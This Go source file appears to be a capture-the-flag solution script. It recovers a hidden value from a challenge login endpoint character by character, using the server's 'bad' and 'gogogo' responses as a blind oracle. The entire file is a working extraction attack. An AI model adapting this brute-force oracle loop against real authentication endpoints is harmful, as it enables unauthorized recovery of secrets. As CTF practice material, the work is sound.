package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

var client = &http.Client{Timeout: 10 * time.Second}

const (
	target  string = "http://jq-me.runcode.ninja/checklogin.php?q="
	charset string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{_-}0123456789"
)

// type jqResp struct {
// 	fail string
// }

func main() {
	guess := ""
	for b := true; b; {
		for _, c := range charset {
			i := makeGuess(fmt.Sprintf("%v%v", guess, string(c)))

			if i == 1 {
				guess += string(c)
				break
			} else if i == 0 {
				guess += string(c)
				b = false
				break
			}
		}
	}
	fmt.Println(guess)
}

func makeGuess(guess string) int {
	// data := new(jqResp)

	r, err := client.Get(fmt.Sprintf("%v%v", target, guess))
	check(err)
	defer r.Body.Close()
	body, err := ioutil.ReadAll(r.Body)
	check(err)

	// err = json.Unmarshal(body, &data)
	// check(err)
	if strings.Contains(string(body), "bad") {
		return 2
	} else if strings.Contains(string(body), "gogogo") {
		return 0
	} else {
		return 1
	}
}

func check(err error) {
	if err != nil {
		panic(err)
	}
}
